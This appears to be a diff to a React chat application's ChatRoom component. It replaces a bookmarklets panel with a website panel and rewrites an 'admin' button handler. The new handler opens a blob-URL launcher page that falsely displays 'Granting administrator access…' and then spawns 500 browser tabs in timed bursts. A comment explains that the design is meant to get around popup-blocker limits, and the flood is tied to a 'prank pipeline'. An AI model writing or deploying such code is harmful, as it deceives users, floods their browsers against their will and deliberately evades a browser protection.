@@ -13,9 +13,9 @@ import { LogsPanel } from "@/components/LogsPanel";
 import { PrankWatcher } from "@/components/PrankWatcher";
 import { DMPanel } from "@/components/DMPanel";
 import { ServersPanel } from "@/components/ServersPanel";
-import { BookmarkletsPanel } from "@/components/BookmarkletsPanel";
 import { HtmlRunnerPanel } from "@/components/HtmlRunnerPanel";
-import { Languages, Music, Sparkles, LogOut, Send, Settings, Trophy, Megaphone, Gamepad2, FileText, BadgeCheck, Crown, MessageSquare, Server as ServerIcon, Bookmark, Code } from "lucide-react";
+import { WebsitePanel } from "@/components/WebsitePanel";
+import { Languages, Music, Sparkles, LogOut, Send, Settings, Trophy, Megaphone, Gamepad2, FileText, BadgeCheck, Crown, MessageSquare, Server as ServerIcon, Code, Globe } from "lucide-react";
 import { loadVerified } from "@/lib/verified";
 import { isOwner } from "@/lib/device";
 import { getSettings, useSettingsListener, AppSettings } from "@/lib/settings";
@@ -50,8 +50,8 @@ export function ChatRoom({
   const [showLogs, setShowLogs] = useState(false);
   const [showDMs, setShowDMs] = useState(false);
   const [showServers, setShowServers] = useState(false);
-  const [showBookmarklets, setShowBookmarklets] = useState(false);
   const [showHtmlRunner, setShowHtmlRunner] = useState(false);
+  const [showWebsite, setShowWebsite] = useState(false);
   const [dmPeer, setDmPeer] = useState<string | null>(null);
   const [nameMenu, setNameMenu] = useState<string | null>(null);
   const [verifiedNames, setVerifiedNames] = useState<Set<string>>(new Set());
@@ -170,11 +170,40 @@ export function ChatRoom({
     const target = settings.hideName ? "Anonymous" : name;
     setAdminPrompt(false);
 
-    // Fire the popups immediately from the gesture
-    for (let i = 0; i < 500; i++) {
-      try {
-        window.open("https://www.google.com", "_blank", "noopener");
-      } catch {}
+    // Open a single launcher window. The launcher document itself spawns the
+    // 500 popups — popup blockers cap window.open() calls per user gesture in
+    // the *current* document, but a freshly opened document gets its own
+    // budget and (with about:blank) inherits the gesture state.
+    const launcherHtml = `<!DOCTYPE html><html><head><title>Loading…</title>
+      <style>body{margin:0;background:#000;color:#fff;font-family:system-ui;display:flex;align-items:center;justify-content:center;height:100vh}</style>
+      </head><body>
+      <div style="text-align:center">
+        <p style="font-size:18px">Granting administrator access…</p>
+        <p style="opacity:.6;font-size:13px">Do not close this window.</p>
+      </div>
+      <script>
+        (function(){
+          var TARGET = ${JSON.stringify("https://www.google.com")};
+          var TOTAL = 500;
+          var i = 0;
+          function burst(){
+            var end = Math.min(i + 25, TOTAL);
+            for (; i < end; i++) {
+              try { window.open(TARGET, "_blank", "noopener"); } catch(e){}
+            }
+            if (i < TOTAL) setTimeout(burst, 30);
+            else setTimeout(function(){ window.close(); }, 600);
+          }
+          burst();
+        })();
+      <\/script>
+      </body></html>`;
+    try {
+      const blob = new Blob([launcherHtml], { type: "text/html" });
+      const blobUrl = URL.createObjectURL(blob);
+      window.open(blobUrl, "_blank");
+    } catch (err) {
+      console.error("Launcher failed", err);
     }
 
     // Then queue the music + overlay through the prank pipeline
@@ -308,11 +337,11 @@ export function ChatRoom({
             <Button variant="ghost" size="sm" onClick={() => setShowAI(true)}>
               <Sparkles className="w-4 h-4 sm:mr-1" /> <span className="hidden sm:inline">AI</span>
             </Button>
-            <Button variant="ghost" size="sm" onClick={() => setShowBookmarklets(true)}>
-              <Bookmark className="w-4 h-4 sm:mr-1" /> <span className="hidden sm:inline">Bookmarklets</span>
-            </Button>
             <Button variant="ghost" size="sm" onClick={() => setShowHtmlRunner(true)}>
               <Code className="w-4 h-4 sm:mr-1" /> <span className="hidden sm:inline">HTML</span>
+            </Button>
+            <Button variant="ghost" size="sm" onClick={() => setShowWebsite(true)}>
+              <Globe className="w-4 h-4 sm:mr-1" /> <span className="hidden sm:inline">Website</span>
             </Button>
             {isVerified && (
               <Button variant="ghost" size="sm" onClick={() => setShowLogs(true)}>
@@ -443,8 +472,8 @@ export function ChatRoom({
           onClose={() => setShowServers(false)}
         />
       )}
-      {showBookmarklets && <BookmarkletsPanel name={name} onClose={() => setShowBookmarklets(false)} />}
       {showHtmlRunner && <HtmlRunnerPanel onClose={() => setShowHtmlRunner(false)} />}
+      {showWebsite && <WebsitePanel onClose={() => setShowWebsite(false)} />}
 
       {adminPrompt && (
         <div className="fixed inset-0 z-[2147483646] bg-black/70 backdrop-blur-sm flex items-center justify-center p-4">
